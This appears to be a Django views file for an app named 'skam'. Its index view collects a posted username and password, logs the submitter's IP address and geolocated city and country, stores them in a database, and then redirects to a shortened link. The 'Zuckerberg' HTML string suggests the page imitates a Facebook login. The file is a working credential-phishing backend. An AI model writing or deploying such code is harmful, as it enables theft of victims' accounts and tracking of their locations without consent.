
from datetime import datetime
from time import timezone
from django.shortcuts import redirect, render
from django.http import HttpResponse, JsonResponse
from django.http import HttpResponseRedirect
from skam.models import Skamdata
from ipware import get_client_ip
from ip2geotools.databases.noncommercial import DbIpCity
# Create your views here.

def index(request):
    if request.method == 'POST' and 'name' in request.POST and 'passwoard' in request.POST and 'btn-sub' in request.POST:
        name = request.POST['name']
        passwoard = request.POST['passwoard']
        now = datetime.now()
        ip, is_routable = get_client_ip(request)
        if ip is None:
            ip = "0.0.0.0"
        # else:
        #     if is_routable:
        #         ipv = "Public"
        #     else:
        #         ipv = "Private"

        # print(ip, ipv)
        
        try:
            response = DbIpCity.get(ip, api_key='free')
            country = response.country + " | " + response.city
        except:
            country = "Unknown"

        # test = request.META.get('HTTP_X_FORWARDED_FOR')
        # if test is not None:
        #     ip = test.split(',')[0]
        # else:
        #     ip = request.META.get('REMOTE_ADDR')
        # print("IP ASSRESS OF USER : ", ip)

        skam = Skamdata(name=name, passwoard=passwoard, created=now, ip=ip, country=country)
        skam.save()
        html = '<html><body> <h1 style="text-align:center"> Al-Esawy Zuckerberg</h1> </body></html>'
        # return HttpResponse(html)
        return redirect("https://bit.ly/3PcmsT9")
    


    return render( request , 'skam/skam.html' )
